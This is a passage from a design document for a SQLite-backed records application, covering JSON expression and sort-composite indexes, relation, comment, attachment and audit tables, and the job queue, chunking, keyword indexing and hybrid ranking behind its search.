neither `relation` nor `attachment` (`fieldtypes.NON_INDEXABLE_TYPES` -- those two can carry
`is_indexed = 1` and have never had an index, because their values are not in `records.data`), and
it is diffed against what `sqlite_master` actually holds.

Auto-enable `is_indexed` for `single_select`, `date`, `datetime`, `user_ref`, and any field marked
`is_unique`, since those are overwhelmingly the fields people filter and group by. Index creation
on an existing large table happens inside the schema-change transaction.

### Sort composites

A per-field index above cannot order a *filtered* page, and at scale that is the difference
between a 3 ms query and a 45 ms one. The compiled query always ends `ORDER BY <sort expr>,
records.id ASC`, because keyset pagination needs a total order, and `records.id` is a UUID
unrelated to rowid, so a single-column index cannot supply that ordering. SQLite's only remaining
plan is to find every row matching the filter and sort all of them, which it does even with
`ANALYZE` and `STAT4` statistics present (both verified at the first full measurement).

So a second index shape exists, created alongside the per-field ones:

```sql
CREATE INDEX ix_sort_<object_type_id_hex32>_<pair_digest12>_<filter_field_key>_<sort_field_key>
  ON records(json_extract(data, '$.<filter_field_key>'),
             json_extract(data, '$.<sort_field_key>'),
             id)
  WHERE object_type_id = '<id>' AND deleted_at IS NULL;
```

Two keys follow the id here and either may contain `_`, so fixed width is not enough on its own:
`<pair_digest12>` is the first twelve hex characters of
`sha256(filter_key + "\x00" + sort_key)` and is what makes the name injective. The keys are kept
after it for the operator reading `sqlite_master`, not for uniqueness -- nothing parses them back
out. Listing a type's composites is a prefix match on `ix_sort_<object_type_id_hex32>_`; with the
old index names the prefix was `ix_sort_<type key>_`, so reconciling type `thing` enumerated and
dropped every composite belonging to type `thing_a`.

**Which pairs exist is bounded, and the bound is the point.** The filter side is restricted to
`single_select` and `boolean` fields (`fieldtypes.LOW_CARDINALITY_TYPES`); the sort side is every
other indexed, scalar-valued field. Pairing every indexed field with every other would be
quadratic; pairing only the inherently non-selective ones with the rest is linear. The measurement
behind the restriction: a filtered page costs about 1.1 microseconds per row *matched*, so a
selective filter never needed the composite. On the seeded corpus a `user_ref` filter matching
2,375 of 90,000 rows already returned in 4 ms, against 39 ms for a `single_select` filter matching
35,961.

One index covers both sort directions: built ascending, it also serves `ORDER BY B DESC, id ASC`,
because SQLite scans it backwards and the trailing `id` column settles ties. Unique fields are
excluded, since their own index already makes a filter on them a single-row lookup.

The set is maintained **declaratively**, by `SchemaService.reconcile_sort_indexes`, rather than
patched field by field: one field's flags can add or remove several composites, and a composite
belongs to a pair rather than to a field. `SchemaService.retire_legacy_index_names` runs once at
startup and reconciles both shapes for every live type, which is also how a deployment that
upgraded into this version acquires them without a migration.

**Upgrading from the old index names costs one index rebuild.** SQLite cannot rename an index, so
that startup pass first drops every index whose name carries an old form -- identified by the segment after the
prefix not being a 32-hex id, the one place in the codebase that reads an index name's structure --
and then rebuilds the desired set. Drops and creates share **one write transaction**: the startup
hook is deliberately non-fatal, and a drop that committed without its create would leave a serving
deployment with no per-type indexes at all. It is idempotent; the second start drops nothing and
creates nothing. `docs/DEPLOYMENT.md` carries the measured cost.

Measured cost of carrying them, at 200,000 records across fifteen object types (45 composites):
the database grew by 59 MB (4.6%), and the read path went from 45.0 ms to 2.8 ms at p50, a factor
of sixteen. The write cost is smaller than the run-to-run variance of the machine it was measured
on: a controlled micro-benchmark over one object type showed 621 to 614 records per second (1.2%),
while whole-corpus seed runs ranged from 567 before to 494 and 535 after. `docs/PERFORMANCE.md`
records both figures rather than picking the flattering one.

Uniqueness is enforced by a unique partial expression index of the same shape.

### Binding constraints on the filter-AST compiler

These are constraints, not suggestions; each is enforced by a named test. They were
verified empirically on 2026-08-23 on SQLite 3.46.1 (`python:3.13-slim`) and 3.50.4 (macOS arm64).

1. **Inline the object type id as a validated literal.** The compiler MUST emit
   `object_type_id = '<id>'` as a literal, never a bound parameter, and MUST validate the id
   against a strict UUID pattern immediately before interpolation, rejecting the query if it
   does not match. Rationale: SQLite uses a partial index only when the query's WHERE terms
   provably imply the index's WHERE clause, and literal term matching is the documented rule
   (https://sqlite.org/partialindex.html). Modern SQLite was observed also honoring bound
   parameters against partial-index predicates by re-planning per binding (a seek on 3.50.4, an
   index scan on 3.46.1, a correct fallback to full scan when the bound value does not match),
   but that behavior is undocumented and varies by version, so the compiler does not rely on
   it. The UUID check exists so that a future refactor routing any other value into this code
   path fails loudly instead of becoming an injection surface; provenance of the id is not the
   defense.
2. **Byte-identical expression text.** The `json_extract(data, '$.<field_key>')` text emitted
   in queries MUST be byte-identical to the text in the index DDL. One module owns both index
   DDL generation and filter compilation.
3. **Enforcement test.** The test suite asserts via `EXPLAIN QUERY PLAN`, over a realistic
   fixture, that a compiled single-type query on an indexed field uses that field's partial
   index. Either SEARCH or SCAN of the index proves the implication held; seek versus scan is
   the planner's cost decision and is not asserted.

**Considered and rejected: composite indexes** of the shape
`(object_type_id, json_extract(...)) WHERE deleted_at IS NULL`. This does sidestep the
implication problem entirely: it produces a two-column SEARCH with plain bound parameters on
both tested SQLite versions, via the documented AND-term match on `deleted_at IS NULL`. It was
rejected because a composite index contains every live record of every object type, which
multiplies index size and per-insert write amplification by the number of object types (15x in
the test fixture; up to 40x at the stated scale ceiling). A size-mitigated variant, partial on
`json_extract(...) IS NOT NULL`, forfeits sort and `is_null` acceleration and requires shared
index lifecycle management when two types use the same field key. Uniqueness must be enforced
by per-type partial unique indexes under every scheme regardless, because a composite unique
index would wrongly impose uniqueness on every type sharing the field key. One uniform per-type
shape with one inlining invariant is simpler and no less capable.

`multi_select` filtering uses `json_each(json_extract(data, '$.field'))` in an `EXISTS` subquery.
An expression index does not help there; at the stated scale this is acceptable. If it becomes a
problem, add a normalized `record_multiselect_values` side table.

## 6. Relations

```sql
CREATE TABLE record_links (
  id             TEXT PRIMARY KEY,
  field_id       TEXT NOT NULL REFERENCES fields(id),   -- the relation field on the source type
  from_record_id TEXT NOT NULL REFERENCES records(id),
  to_record_id   TEXT NOT NULL REFERENCES records(id),
  position       INTEGER NOT NULL DEFAULT 0,            -- ordering within a 'many' relation
  created_at     TEXT NOT NULL,
  created_by     TEXT NOT NULL REFERENCES principals(id)
);
CREATE UNIQUE INDEX ix_links_unique ON record_links(field_id, from_record_id, to_record_id);
CREATE INDEX ix_links_from ON record_links(from_record_id);
CREATE INDEX ix_links_to   ON record_links(to_record_id);
```

- Many-to-many is the default storage shape. `cardinality: 'one'` is enforced in the service layer
  by rejecting a second link, not by a different table.
- **Self-referential relations** require only that `target_type_key` equals the field's own object
  type. This is the mechanism for micro-process to macro-process hierarchies, initiative
  parent/child, and any other tree. No special casing.
- If `inverse_field_key` is set, the service maintains the reciprocal link so both sides query
  naturally. The inverse field is auto-created on the target type when the relation is defined.
- Cycle detection is **not** enforced at MVP. Hierarchy-walking helpers cap traversal depth
  instead.
- Deleting a record with inbound links is blocked and returns the blocking record keys, unless
  `force: true` (FR-L4).
- **Every link summary carries the target's display value.** Both relation read paths -- the
  `links` include on `get_record` (`RecordService.list_link_summaries`) and `expand_relations`
  (`_expand_record`, FR-L6) -- return `{key, id, display}`, where `display` is the value of the
  **target type's** display field (section 3, DD-23). It is `null` when the target type has no
  eligible field or that record's value is empty; every reader falls back to the key.
- A link into a type the caller cannot read is **redacted, not hidden**: the entry
  is exactly `{"redacted": true}` and gains no `display`, because `display` is a title. The key is
  absent rather than null, so the count stays truthful and nothing else leaks.

## 7. Comments

```sql
CREATE TABLE comments (
  id             TEXT PRIMARY KEY,
  record_id      TEXT NOT NULL REFERENCES records(id),
  body           TEXT NOT NULL,                -- markdown
  author_id      TEXT NOT NULL REFERENCES principals(id),
  agent_label_id TEXT REFERENCES agent_labels(id),
  created_at     TEXT NOT NULL,
  updated_at     TEXT NOT NULL,
  edited         INTEGER NOT NULL DEFAULT 0,
  deleted_at     TEXT,
  deleted_by     TEXT REFERENCES principals(id)
);
CREATE INDEX ix_comments_record ON comments(record_id, created_at) WHERE deleted_at IS NULL;
```

- Flat list ordered by `created_at`. No threading at MVP.
- Edits set `edited = 1` and write an audit event containing the full prior body. Prior bodies live
  in the audit store, not in a separate revisions table.
- Deletes are soft. The UI shows a tombstone to admins and hides the row from members.
- `records.comment_count` and `records.last_comment_at` are updated in the same transaction, which
  is what makes them cheap to filter and sort on (FR-C8).
- Comment bodies enter the embedding and FTS indexes (FR-C7). This is what makes "find all
  mentions of sales pricing" work against discussion rather than only against structured fields.

## 8. Attachments

```sql
CREATE TABLE attachments (
  id            TEXT PRIMARY KEY,
  sha256        TEXT NOT NULL,                 -- content address, enables dedup
  filename      TEXT NOT NULL,
  content_type  TEXT NOT NULL,
  byte_size     INTEGER NOT NULL,
  uploaded_at   TEXT NOT NULL,
  uploaded_by   TEXT NOT NULL REFERENCES principals(id)
);
CREATE INDEX ix_attachments_sha ON attachments(sha256);
```

Bytes are stored at `<DATA_DIR>/attachments/<sha256[0:2]>/<sha256>`. Identical content uploaded
twice produces two rows and one file. Download requires authentication and is streamed by the app,
never served directly from disk by a proxy.

### record_attachments (DD-11)

`attachments` carries no record id and no object type id, and an attachment field's value is a
list of attachment ids inside `records.data`. Blobs are shared by content hash, so "the owning
record" is legitimately zero, one, or many records across several object types. Answering "may
this caller read this attachment" against an object type therefore needs a materialized reverse
index, which is what this is.

```sql
CREATE TABLE record_attachments (
  record_id     TEXT NOT NULL REFERENCES records(id),
  attachment_id TEXT NOT NULL REFERENCES attachments(id),
  field_key     TEXT NOT NULL,
  PRIMARY KEY (record_id, field_key, attachment_id)
);
CREATE INDEX ix_record_attachments_attachment ON record_attachments(attachment_id);
```

Maintained by `RecordService._sync_attachment_refs`, called immediately after **every** write of
`records.data` -- `create_record`, `update_record`, `bulk_update` -- from the record's *stored*
data rather than the supplied patch, so clearing a field drops its rows and an update that omits
the field keeps them. CSV import and both revert paths reach it through those three rather than
around them. A missed path would fail **open**, not closed: an attachment with no join rows falls
back to the uploader clause and becomes invisible to everyone else, which reads as working until
the wrong person cannot see a file, so there is a test per write path rather than an inspection of
the funnel.

Keyed on `attachment_id` rather than on the content hash: attachment rows are per upload, so two
principals uploading identical bytes get distinct ids backed by one blob, and keying on the row
leaks nothing across types. `sweep_orphan_blobs` is unaffected, because it already counts by hash.

`ix_record_attachments_attachment` exists because the read rule below looks up by `attachment_id`
alone. The table's primary key leads with `record_id`, so it cannot answer that lookup: every
attachment download runs `object_type_ids_for_attachment` (`repositories/sqlite.py`), which needs
every record referencing one attachment id, not every attachment referenced by one record. Without
this index that query is a full scan of `record_attachments`.

Ids in `records.data` that resolve to no `attachments` row are not written here. Attachment field
values are opaque ids validated only for shape, and the read rule does not narrow that contract --
but a join row for an attachment that does not exist would be neither insertable
against the foreign key nor useful, since there is nothing there to authorize.

**The read rule.** An attachment is readable if the caller holds `read` on the object type of
**any** referencing record, **or** is its `uploaded_by`. The uploader clause is required, not a
convenience: between `POST /api/v1/attachments` and the record write that attaches the id there is
no referencing row at all.

**Orphan sweeping (FR-P2).** A blob whose last referencing `attachments` row is gone is
deleted by `AttachmentService.sweep_orphan_blobs`, which compares the hashes on disk against
`SELECT DISTINCT sha256 FROM attachments`. The comparison is by content hash and not by row, and
that is not an optimization: deduplication means one file can back many rows, so only the absence
of *every* referencing row makes a blob deletable.

The sweep runs on demand (`POST /api/v1/admin/blobs/sweep`, `admin`) and as a bounded pass at
startup. **There is no timer**: the two triggers above cover the need without adding a third
moving part. The bounded startup pass is what handles the concrete case DD-36 names, where a
blob written during a backup is copied into the artifact and arrives on the restored volume with
nothing pointing at it.

## 9. Audit

```sql
CREATE TABLE audit_events (
  id             INTEGER PRIMARY KEY AUTOINCREMENT,   -- also the change-feed cursor
  ts             TEXT NOT NULL,
  request_id     TEXT NOT NULL,                       -- correlates all rows from one call
  principal_id   TEXT NOT NULL REFERENCES principals(id),
  principal_type TEXT NOT NULL,
  agent_label_id TEXT REFERENCES agent_labels(id),
  auth_method    TEXT NOT NULL,                       -- 'session' | 'pat'
  surface        TEXT NOT NULL,                       -- 'ui' | 'api' | 'mcp'
  entity_type    TEXT NOT NULL,                       -- 'record' | 'comment' | 'link'
                                                      -- | 'object_type' | 'field' | 'principal'
                                                      -- | 'access_token' | 'schema_proposal'
                                                      -- | 'session' | 'invite'
  entity_id      TEXT NOT NULL,
  record_id      TEXT,                                -- set for record/comment/link events
  object_type_id TEXT,
  action         TEXT NOT NULL,                       -- 'create' | 'update' | 'delete'
                                                      -- | 'restore' | 'link' | 'unlink'
  field_key      TEXT,                                -- set for record field updates
  old_value      TEXT,                                -- JSON
  new_value      TEXT,                                -- JSON
  note           TEXT                                 -- e.g. 'revert of event 4412'
);
CREATE INDEX ix_audit_record  ON audit_events(record_id, id);
CREATE INDEX ix_audit_actor   ON audit_events(principal_id, id);
CREATE INDEX ix_audit_agent   ON audit_events(agent_label_id, id);
CREATE INDEX ix_audit_ts      ON audit_events(ts);
CREATE INDEX ix_audit_type    ON audit_events(object_type_id, id);
```

Rules:

- **One row per changed field** on a record update (FR-D2). A call changing three fields writes
  three rows sharing a `request_id`.
- A record create writes one row per non-empty field plus one `create` row for the record itself.
- Application code never issues `UPDATE` or `DELETE` against this table.
- The autoincrement `id` doubles as the **change-feed cursor** for `list_changes_since`, which
  avoids a separate outbox table and guarantees the feed and the audit agree.
- **Revert** reads the target event, computes the inverse, and performs a normal forward write that
  produces its own audit rows with a `note` referencing the reverted event (FR-D6).
- Pre-change snapshots for approved destructive schema proposals are written as a single audit row
  with the full affected dataset in `old_value` and `snapshot_ref` linking from the proposal.
- **An envelope resolves its foreign ids to human labels at the repository layer** (DD-25), in the
  same query that reads the row: `principal_display_name`, `record_key`, and the
  agent label's text as `agent_label`, all by `LEFT JOIN`. The serializers stay pure row-to-dict
  functions and one page of events stays one query. The comment envelope carries
  `principal_display_name` and `agent_label` on the same terms.

  The joins are `LEFT` for two different reasons worth keeping apart. For the principal and the
  record it guards a referent that is gone, plus the common `record_id IS NULL` case that every
  schema-level event has. For the agent label the **absent case is the ordinary one**: every write
  by a person at a keyboard has no label, so `agent_label IS NULL` is not an edge case to tolerate
  but the majority, and `docs/DESIGN.md` 6.5 turns on the distinction — the primitive renders no
  agent at all rather than fabricating one.

  Without the joined text an agent label reaches the frontend only as a UUID, which the comment
  header, the record timeline and the audit browser would each render raw. That is a backend gap
  wearing a frontend defect's clothes: with no label text on the wire, there is nothing else to
  render.

`object_type_id` is load-bearing for authorization (DD-11): `AuditService.search` and
`ChangeFeedService.list_changes_since` filter on it in SQL (`_access_clause`,
`repositories/sqlite.py`), restricting each caller to the object types it holds `read` on. A row
whose `object_type_id` is `NULL` is included only for a caller `AccessService.is_unrestricted`
accepts -- a `role == 'admin'` principal whose credential scope has not narrowed below `read` -- so
an untyped row defaults to administrator-only rather than to universally visible.

This is a **fail-closed heuristic, not a guarantee**. The column is nullable, carries no foreign
key, and nothing ties it to the audit event's `entity_type`; it is populated by whichever call site
remembers to pass it. `services/comments.py` already writes `NULL` when a comment's own record
lookup comes back empty, on `update_comment` and `delete_comment`: the column was shaped as a
display convenience and is read as an authorization signal as well. A guarantee would need either a
`NOT NULL` constraint scoped to the entity types that always have a determinable type (with a
`CHECK` tying `entity_type` to whether `object_type_id` may be null), or dropping the stored copy
and deriving it at query time by joining `record_id` back through `records` for every entity type
that carries one. Neither is done, deliberately: both are a schema-hardening pass over
`audit_events` separate from the third authorization axis itself, and the direction the current
shape fails in is the safe one.

## 10. Search indexes

### Index eligibility

A source is eligible for **both** indexes or for neither. There is no field that is keyword
searchable but not semantically searchable.

- A **field** source is eligible when its type is `short_text` or `long_text` **and** its `embed`
  flag is true. `embed` is a real per-field setting, not a type rule: section 3 defaults it to `1`
  for `long_text` and `0` for everything else, and `update_field` accepts a change to it on any
  field, so an administrator turning `embed` off on a `long_text` field must actually turn
  indexing off for that field. The type test is part of the rule because the schema service
  permits `embed = true` on a field of any type; a `number` field with the flag set is not
  indexed.
- A **comment** source is always eligible (FR-C7). Comments carry no `embed` flag.
- `embed` gates the FTS row as well as the embedding rows. FR-Q3 says "indexed content", not
  "embedded content", and DD-33's golden class (E) negative (a term present only in a
  non-opted-in field must not be found) is false in hybrid mode if the keyword arm still holds
  that field's text.

### embeddings

```sql
CREATE TABLE embeddings (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  source_type   TEXT NOT NULL,                 -- 'field' | 'comment'
  record_id     TEXT NOT NULL REFERENCES records(id),
  object_type_id TEXT NOT NULL,
  field_key     TEXT,                          -- set when source_type='field'
  comment_id    TEXT,                          -- set when source_type='comment'
  chunk_index   INTEGER NOT NULL DEFAULT 0,
  chunk_text    TEXT NOT NULL,                 -- retained for snippet rendering
  content_hash  TEXT NOT NULL,                 -- skip re-embedding unchanged content
  model_id      TEXT NOT NULL,
  created_at    TEXT NOT NULL
);
CREATE INDEX ix_emb_record ON embeddings(record_id);
CREATE INDEX ix_emb_hash   ON embeddings(content_hash);

-- sqlite-vec virtual table; rowid matches embeddings.id. Both partition keys are declared by
-- migration 6: a KNN constrained by `object_type_id IN (...)` and `model_id = ?` is answered
-- inside those partitions, so scoping a search to a small object type, or querying part-way
-- through a model-swap re-index, never post-filters a global pool down to nothing (verified
-- against sqlite-vec 0.1.9, whose metadata columns cannot be KNN constraints). Partition-key
-- values are never updated (sqlite-vec forbids it): a source's rows are inserted and deleted,
-- never moved between types or models.
CREATE VIRTUAL TABLE vec_embeddings USING vec0(
  embedding      float[384],
  object_type_id text partition key,
  model_id       text partition key
);
```

`source_type`, `field_key`, and `comment_id` are what let search results report the **hit source**
(FR-Q4): "matched in the `risk_summary` field" versus "matched in a comment by Dana on Mar 3."

### embedding_jobs

Durable queue so indexing survives restarts (FR-Q7).

```sql
CREATE TABLE embedding_jobs (
  id           INTEGER PRIMARY KEY AUTOINCREMENT,
  record_id    TEXT NOT NULL,
  source_type  TEXT NOT NULL,
  field_key    TEXT,
  comment_id   TEXT,
  status       TEXT NOT NULL DEFAULT 'pending',  -- 'pending' | 'running' | 'failed'
  attempts     INTEGER NOT NULL DEFAULT 0,
  last_error   TEXT,
  enqueued_at  TEXT NOT NULL,
  updated_at   TEXT NOT NULL
);
CREATE INDEX ix_jobs_pending ON embedding_jobs(status, id);
-- Enqueue coalescing: at most one *pending* job per source. NULLs are
-- distinct to a unique index, so the nullable columns are coalesced in the index expression.
CREATE UNIQUE INDEX ux_jobs_pending_source
  ON embedding_jobs(record_id, source_type, coalesce(field_key, ''), coalesce(comment_id, ''))
  WHERE status = 'pending';
```

Jobs are enqueued in the same transaction as the write that dirtied the content, with
`INSERT ... ON CONFLICT DO NOTHING` against `ux_jobs_pending_source`, so ten edits before the
worker runs leave one job; a job already `running` when a new write lands gets a fresh `pending`
sibling rather than being lost. A job carries no text: the worker re-reads the source's *current*
value when it claims the job, so the last write always wins. When `GW_EMBEDDING_ENABLED` is false
the worker does not start and writes enqueue nothing (section 13).

**Queue state rules.** `ux_jobs_pending_source` makes `pending` a scarce state, so every
transition into it has to say what happens when the slot is already taken. Rules 1 to 5 each have
a test; rule 6 and part of rule 5 are DD-35's.

1. **Enqueue supersedes a prior failure.** Enqueuing for a source first deletes any `failed` row
   for that same source, then inserts with `ON CONFLICT DO NOTHING`. A new write supersedes a past
   failure on that content, so the status endpoint reports what is true now rather than a
   permanent record of past failures. Without this, a source that failed five times, was
   rewritten, and then indexed successfully is listed as failed forever, and the only other
   remedy on offer (re-index everything) is not what fixes it.
2. **Claim carries the backoff predicate.** The worker claims up to 32 rows in `id` order with
   `BEGIN IMMEDIATE` and `RETURNING`, selecting `status = 'pending'` **and** `updated_at` at least
   `min(300, 2 ** attempts)` seconds old. The backoff is enforced here, not by the reclaim path:
   reclaim only ever looks at `running` rows, so a `pending` row is claimed and never reclaimed,
   and a backoff expressed as a reclaim delay is a no-op that lets a failing job burn all five
   attempts in a few seconds.
3. **One write transaction per source, and it deletes the job.** The worker claims a batch but
   commits per source: replacing that source's `embeddings`, `vec_embeddings`, and `fts_content`
   rows and deleting its job happen in one transaction, so the queue count and the chunk count are
   never observably out of step (the container proof polls the first and then asserts an exact
   value for the second). A batch-wide write transaction is not permitted: it would hold
   `BEGIN IMMEDIATE` across up to 2,048 vector inserts while `busy_timeout` is 5,000 ms
   (section 14), failing concurrent user writes.
4. **A transition into `pending` yields to a live sibling.** A failing job, a reclaimed stale job
   and a job released by a stop all want to become `pending`, and each can find a `pending`
   sibling enqueued while it was `running`; the transition would then violate
   `ux_jobs_pending_source` inside the very handler whose job is to handle failure. When a sibling
   exists, the `running` row is deleted and its `attempts` and `last_error` are carried onto the
   sibling, so the five-attempt terminal state counts the source's failures instead of resetting
   on every concurrent edit. Only when no sibling exists does the row transition in place. A
   release is the one case that carries `attempts` and **not** `last_error`, because it is not a
   failure and the sibling's own error is still the true one (rule 6).
5. **Reclaim runs on the idle poll, and startup reclaims everything** (DD-35). On the **idle
   poll**, `running` rows whose `updated_at` is older than a
   ten-minute timeout are reclaimed under rule 4: an `Exception` escaping `run_once` outside
   `_process`'s handler (`fail_job`'s own write failing on `busy_timeout`, say) leaves the rest
   of the batch `running` while the thread survives, and those rows would otherwise stay
   stranded for the life of the process and `pending_jobs` would never reach zero. A
   `BaseException` kills the thread instead, so the idle reclaim never runs for it and only the
   next startup recovers its rows. The idle reclaim runs only on the worker's own thread,
   between batches, while it holds nothing, so a `running` row it finds was abandoned by that
   same process: the ten-minute threshold is margin, not protection for a live holder, and a
   pause of any length (a suspended machine, a sleeping laptop) cannot make the worker reclaim
   its own work. `test_a_pause_longer_than_the_timeout_inside_a_batch_charges_nothing` holds
   that, and `test_only_the_worker_thread_reclaims` holds that no other code reclaims. A second
   process on one database would reclaim rows the first still holds; that is unsupported, not
   impossible, and the entry point pins one process (`docs/DEPLOYMENT.md` section 2a). A
   restart-only reclaim cannot be caught by a test that starts a fresh worker, so the test
   reclaims on a worker that never restarted. At **startup** there is no age threshold at all:
   every `running` row is reclaimed, because only the application lifespan ever constructs a
   worker and the documented upgrade stops the old container before starting the new one, so at
   that instant a `running` row can only be the residue of an unclean exit. Both paths count an
   attempt, which is what stops a source that kills the process from being retried forever.
6. **A stop releases the rest of the claimed batch, and charges nothing.** The worker checks its stop event between sources. The source in hand is always
   finished, because its write is one transaction and interrupting it is what rule 3 prevents;
   every source claimed but not started returns to `pending` with `attempts`, `last_error` and
   `updated_at` left exactly as they are. This is a rule 4 transition, so a live `pending` sibling
   takes the released row's `attempts` and keeps its own `last_error`. Leaving `updated_at` at the
   claim time means rule 2's backoff still holds the row for `min(300, 2 ** attempts)` seconds, so
   a released row is claimable again a second later rather than instantly. No attempt is charged:
   a stop nobody asked for is not a failed attempt, and counting it would let a workspace that
   scales to zero five times mark its own content `failed`.

A failing job increments `attempts` and records `last_error`; after five attempts it is `failed`
and surfaces in admin settings.

### Chunking policy (DD-33)

- The unit is the model's own WordPiece tokens, never characters.
- Chunk size is 256 tokens, excluding `[CLS]` and `[SEP]`.
- Split points are preferred in the order paragraph break (blank line), sentence end, token
  window. Whole units are packed greedily until the next unit would exceed 256 tokens, so prose is
  never cut mid-sentence.
- Overlap is 32 tokens and applies only to hard splits (a single unit longer than 256 tokens that
  must be windowed). Unit-packed chunks share no text.
- A value shorter than the limit is one chunk. Empty or whitespace-only values produce no chunk
  and no job. A source is capped at 64 chunks, logged when the cap truncates.
- `chunk_index` is 0-based in document order; `chunk_text` is exactly the text embedded.
- `content_hash` is sha256 over `model_id`, a NUL byte, and `chunk_text`. `model_id` is
  revision-qualified (`bge-small-en-v1.5@5c38ec7`), so a model swap makes every existing row
  visibly stale.
- **An unchanged chunk keeps its row; the source's rows are not wholesale replaced.**
  `embeddings.id` is the `vec_embeddings` rowid, so deleting a source's
  rows and re-inserting them assigns new ids and orphans the vectors of chunks whose text did not
  change. The worker instead matches the newly computed chunks against the source's stored
  `content_hash` rows, preserves a matching row in place (updating only `chunk_index` when the
  chunk moved), inserts rows only for hashes with no match, and deletes rows whose hash is no
  longer present. An edit to one paragraph re-embeds one paragraph and leaves every other stored
  vector byte-identical, which is what the test asserts: asserting only that the provider was
  not called passes under the broken implementation too.
- `content_hash` is **not** unique within a source, because a repeated paragraph yields two chunks
  with the same hash, so the match above is multiset-aware: N stored rows carrying a hash satisfy
  at most N new chunks carrying that hash.
- The constants live in `services/search_tuning.py` and change only against the golden set.

### Keyword index

```sql
CREATE VIRTUAL TABLE fts_content USING fts5(
  body,
  record_id UNINDEXED,
  source_type UNINDEXED,
  field_key UNINDEXED,
  comment_id UNINDEXED,
  tokenize = 'porter unicode61'
);
```

Maintained in the same transaction as the source write, since FTS5 indexing is cheap and
synchronous, unlike embedding. One row per source (a whole field value or a whole comment body),
not per chunk: FTS5 has no length problem and a whole-text row gives the best `snippet()`. The
row is replaced whenever its source changes.

**`search_sources`: stable integer identity per source.**

```sql
CREATE TABLE search_sources (
  id             INTEGER PRIMARY KEY AUTOINCREMENT,
  record_id      TEXT NOT NULL,
  object_type_id TEXT NOT NULL,
  source_type    TEXT NOT NULL,                -- 'field' | 'comment'
  field_key      TEXT,
  comment_id     TEXT
);
CREATE UNIQUE INDEX ux_search_sources
  ON search_sources(record_id, source_type, coalesce(field_key, ''), coalesce(comment_id, ''));
CREATE INDEX ix_search_sources_type ON search_sources(object_type_id, field_key);
```

An `fts_content` row is inserted with an explicit rowid taken from here, so *replacing* a
source's keyword row is a rowid delete rather than a predicate over `UNINDEXED` columns. This fifth search table is
load-bearing rather than tidy:
FTS5 keeps `UNINDEXED` columns in a content shadow table with no index on them, so
`DELETE FROM fts_content WHERE record_id = ?` is a full scan — measured as **26 ms per source against 200,000 rows, against 0.007 ms by rowid**. A schema change
writes or purges one FTS row per live record of its type, and the purge stays inside the change's
own transaction (DD-34), so the scanning form would turn that into tens of minutes holding
SQLite's single writer lock at PRD section 4's stated scale. `object_type_id` rides along
so purging a field's or an object type's rows is one indexed delete rather than a join back
through `records`.

**Keyword query construction.** Raw user text never
reaches `MATCH`. The query is split on whitespace; each word becomes one FTS5 phrase made of its
alphanumeric runs (`PO-88213` becomes `"PO 88213"`, `CTR-2024-117` becomes `"ctr 2024 117"`), so
an identifier matches only text carrying that identifier rather than any text carrying `PO`; a
word that is a single run on a fixed query-side stopword list (`QUERY_STOPWORDS` in
`services/search_tuning.py`: articles, conjunctions, prepositions, pronouns, auxiliaries) is
dropped, because FTS5 has no stopword list of its own and matches a term present in every row at
bm25 `-1e-06`, which on a small corpus fills the tail of every result list with rows that share
only "the"; the phrases are OR-joined and ordered by `bm25`. Porter applies inside phrases, so
`"pricing"` still finds `priced` and `prices`. FTS5 operators typed by a user (`NOT`, `NEAR`,
`*`, quotes, parentheses) never appear outside a phrase's alphanumeric runs and are therefore data,
not syntax. `MATCH` is written against the unaliased table name; aliasing an FTS5 table breaks the
operator.

Deleted content is excluded at query time, not by index deletion: both arms join `records` on
`deleted_at IS NULL`, and comment sources join `comments` on `deleted_at IS NULL`. Soft deletes and
restores touch neither index. Rows are purged only when their source ceases to exist or to be
eligible: a field deleted, an object type deleted, a field's type changed away from text, or a
`short_text` field's `embed` flag turned off.

### Query embedding

bge models are asymmetric. Search **queries** MUST be embedded with the prefix
`Represent this sentence for searching relevant passages: ` prepended to the query text, per the
model card; document and comment chunks are embedded without it. Omitting the prefix silently
degrades retrieval quality, so the embedding provider interface distinguishes `embed_query` from
`embed_passages` and callers cannot pick the wrong one by accident. The provider prepends the
prefix inside `embed_query`; no caller ever sees or stores it, so `chunk_text` and `content_hash`
can never include it. DD-33 asserts the asymmetry directly, because reversing it passes every
functional test.

### Hybrid ranking

The rules below (DD-33) fix the grain of "candidates" and the meaning of `other_matches`.

1. **Two arms, each scoped before its limit.** The keyword arm runs the constructed FTS5 query
   over `fts_content` joined to `search_sources` (for `object_type_id`), `records`
   (`deleted_at IS NULL`), and, for comment sources, `comments` (`deleted_at IS NULL`), ordered by
   `bm25` and limited to `4 x limit` **rows**. The vector arm embeds the query (with the bge
   prefix, inside `embed_query`) and runs a KNN over `vec_embeddings` constrained by
   `object_type_id IN (<in-scope types>)` and `model_id = <the current provider's>`, so a
   not-yet-re-embedded source is invisible to the semantic arm during a model-swap re-index rather
   than ranked by a distance between two vector spaces; the KNN rows are joined the same way and
   limited to `4 x limit` **chunk rows** by distance. With no `object_types`, every live type is
   in scope. Two engine facts shape the vector arm's statement: the KNN runs
   inside a `MATERIALIZED` CTE, because SQLite otherwise flattens the subquery and pushes the
   outer `LIMIT` into vec0, which refuses `LIMIT` and `k` together; and `records.deleted_at` is
   invisible inside the virtual table, so a soft-deleted record's chunks do occupy KNN slots. The
   live join therefore runs over every KNN row, the pool is the first `4 x limit` live rows, and
   the pre-join KNN count is what tells the service the pool was full (rule 4's widen) rather
   than reading an emptied pool as "nothing more to find". The keyword arm needs neither: its
   join precedes `LIMIT` in the one statement.
2. **Collapse each arm to records before ranking.** A record's rank in an arm is the position of
   its best row among the distinct records in that arm's pool, so a 64-chunk record occupies one
   rank rather than filling the pool, and a record matching in several sources is one candidate.
3. **Fuse with reciprocal rank fusion** at record grain: `raw = sum(1 / (60 + rank_arm))` over
   the arms the record appears in, both arms weighted 1.0, then normalize by
   `arms_run / (60 + 1)`, where `arms_run` is the number of arms that ran (2 for hybrid with
   embedding enabled, otherwise 1), so a record ranked first in every arm that ran scores exactly
   1.0 in every mode. Ties break by better best-arm rank, then better keyword rank (an exact word
   match over a near neighbour), then `records.id`; that is an ordering of exact ties, not an arm
   weight (DD-33 defers weights). Fusion is a pure function in the search service, not a
   repository method.
4. **Apply the caller's structured filter as a post-filter over candidate record ids.** The
   filter compiles through the filter-AST compiler per in-scope object type and is applied as
   `records.id IN (<candidates>) AND <compiled>`; when `object_types` names exactly one type it
   may reference that type's fields, otherwise only system pseudo-fields, and a user-field
   reference is `validation_failed` naming the one-type rule. `@me` and date tokens resolve as in
   `query_records`. **Starvation:** if fewer than `limit` distinct records survive the filter and
